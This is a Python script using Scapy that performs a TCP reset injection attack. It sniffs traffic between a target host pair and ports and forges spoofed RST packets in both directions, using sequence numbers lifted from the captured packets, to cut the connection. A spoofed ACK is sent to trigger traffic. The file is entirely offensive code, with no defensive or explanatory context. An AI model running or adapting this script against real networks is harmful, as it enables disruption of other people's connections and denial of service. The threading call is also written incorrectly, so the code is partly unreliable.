from scapy.all import *
import signal

src = ''
dst = ''
sport = ''
dport = ''

def signal_handler(signal,frame):
    os._exit(0)
def recv_packet(pktdata):
    print(pktdata.show())
    if pktdata['IP'].proto == 6 and pktdata['TCP']:
        seqno = pktdata['TCP'].ack
        ackno = pktdata['TCP'].seq
        send(IP(src=dst, dst=src) / TCP(sport=int(dport), dport=int(sport), flags="R", seq=ackno, ack=seqno), verbose=0)
        send(IP(src=src, dst=dst) / TCP(sport=int(sport), dport=int(dport), flags="R", seq=seqno), verbose=0)
        print("RST success")


def sniff_recv(data):
    flt = "dst host " + str(src) + " and dst port " + str(sport) + " and src host " + str(dst) + " and src port " + str(dport)
    print("sniff")
    print(flt)
    sniff(prn = recv_packet,store = 0,filter=flt)


def send_rst(data):
    print("start")
    global src
    src = data[2]
    global dst
    dst = data[3]
    global sport
    sport = data[4]
    global dport
    dport = data[5]
    #signal.signal(signal.SIGINT,signal_handler)
    t1 = threading.Thread(target=sniff_recv(data))
    t1.start()
    time.sleep(1)
    print("send")
    send(IP(src=src, dst=dst) / TCP(sport=int(sport), dport=int(dport), flags="A"), verbose=0)

